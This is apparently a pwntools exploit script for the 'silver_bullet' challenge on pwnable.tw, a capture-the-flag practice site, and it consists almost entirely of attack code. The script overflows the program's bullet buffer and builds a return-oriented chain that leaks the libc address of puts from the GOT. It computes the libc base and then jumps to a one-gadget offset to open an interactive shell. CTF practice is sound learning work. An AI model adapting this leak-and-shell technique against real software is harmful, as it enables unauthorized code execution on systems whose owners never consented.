from pwn import *

def create (data):
    r.sendafter("choice :", str(1))
    r.sendafter("bullet :", data)

def power (data):
    r.sendafter("choice :", str(2))
    r.sendafter("bullet :", data)

def beat ():
    r.sendafter("choice :", str(3))

def ret () :
    r.sendafter("choice :", str(4))

r = process("./silver_bullet")
#r = remote("chall.pwnable.tw", 10103)

puts_got = 0x804afdc
puts_plt = 0x80484a8
main_addr = 0x8048954

create(b'a' * 0x2f)
power('a')
pause()
power(b'd'*7 + p32(puts_plt) + p32(main_addr) + p32(puts_got)) 
beat()
beat()
r.recvuntil('Oh ! You win !!\n')
libc = u32(r.recv(4)) - 0x005f140
success('libc base -> %s' % hex(libc))

create(b'a' * 0x2f)
power('a')
power(b'd'*7 + p32(libc+0x3a819))
beat()
beat()


r.interactive()
